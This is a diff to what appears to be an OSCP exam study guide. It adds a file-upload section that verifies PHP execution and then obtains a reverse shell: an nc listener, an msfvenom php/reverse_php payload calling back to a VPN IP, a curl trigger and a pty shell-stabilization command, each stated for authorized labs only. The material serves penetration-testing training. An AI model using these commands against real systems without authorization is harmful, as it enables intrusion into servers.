@@ -527,6 +527,56 @@ The bytes remain plain text even when the declared MIME type is `image/png`. An 
 
 **OSCP exam tool check:** [OffSec's OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits **Burp Free** and prohibits **Burp Pro**, automatic exploitation tools and AI chatbot assistance during the exam. `curl` is used here only for one manually chosen HTTP request. Recheck the latest rules before exam day.
 
+### File Upload — Part 3: verify PHP execution and obtain a reverse shell
+
+Use this workflow **only for authorized OSCP labs**. After an application accepts a PHP upload, first verify that the web server **executes** it; uploading or downloading a `.php` file alone is not enough. The commands below assume a PHP-capable Linux web server and a known, in-scope upload URL.
+
+**1. Upload a harmless PHP execution marker**, using the upload method verified in Parts 1–2:
+
+```bash
+printf '%s\n' '<?php echo "OSCP_UPLOAD_SUCCESS"; ?>' > oscp-test.php
+```
+
+After uploading, visit the **actual returned file URL** (the following path is only illustrative):
+
+```bash
+curl -i "http://TARGET/uploads/oscp-test.php"
+```
+
+If the response contains `OSCP_UPLOAD_SUCCESS` **without displaying the PHP source**, that suggests PHP ran on the server. If PHP source is shown, the file is downloaded, or access is blocked, do **not** assume execution. Confirm the marker did not appear in the baseline.
+
+**2. Once execution is confirmed, set up a reverse-shell listener** on your Kali machine:
+
+```bash
+ip -br addr                 # Identify your VPN interface/IP
+nc -lvnp 4444               # Run in a separate terminal
+```
+
+**3. Generate a non-Meterpreter PHP reverse shell** for your VPN IP and the matching listener port:
+
+```bash
+msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=4444 -f raw -o oscp-shell.php
+```
+
+Replace `10.10.14.2` with **your actual Kali VPN IP**. Upload `oscp-shell.php` through the verified vulnerability, then request the **actual uploaded file URL** to trigger it:
+
+```bash
+curl -i "http://TARGET/uploads/oscp-shell.php"
+```
+
+If the target can connect back and PHP execution is enabled, check your Netcat terminal for an incoming shell. The HTTP request may remain open while the shell runs. Only run this on systems you are authorized to exploit.
+
+**4. Stabilize an interactive shell**, if Python 3 and Bash exist on the target:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+Then verify context with `whoami`, `id`, and `hostname`. This shell initially runs with the web service's privileges, **not automatically root**. If there is no callback, check the VPN IP, port, listener, routing, outbound filtering, PHP execution, and any disabled PHP functions. Record sanitized evidence, not secrets.
+
+**OSCP exam tool check:** The [official OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits Burp Free and allows `msfvenom` on all targets; Metasploit modules and **Meterpreter** are restricted to one target. The `php/reverse_php` payload used above is **not Meterpreter**. `nc` is a manual listener, not an automatic exploitation tool. Do not use AI chatbots during the actual exam. Exam proof files must be read in an **interactive shell** with `cat` or `type` from their original location—**not through a web shell**.
+
 ## Additional enumeration checks
 
 ### Inspect JavaScript and discover referenced endpoints
@@ -649,6 +699,7 @@ Next step:
 - [ ] For identified traversal inputs, manually compare standard, URL-encoded, double-encoded and nested path variants.
 - [ ] Identify upload restrictions with a harmless test file; document storage and retrieval behavior.
 - [ ] Test extension and multipart Content-Type validation manually using harmless upload files; verify storage and retrieval.
+- [ ] After confirming PHP execution, obtain and stabilize an authorized reverse shell; record the shell context.
 - [ ] Save sanitized evidence and next actions.
 
 ## References
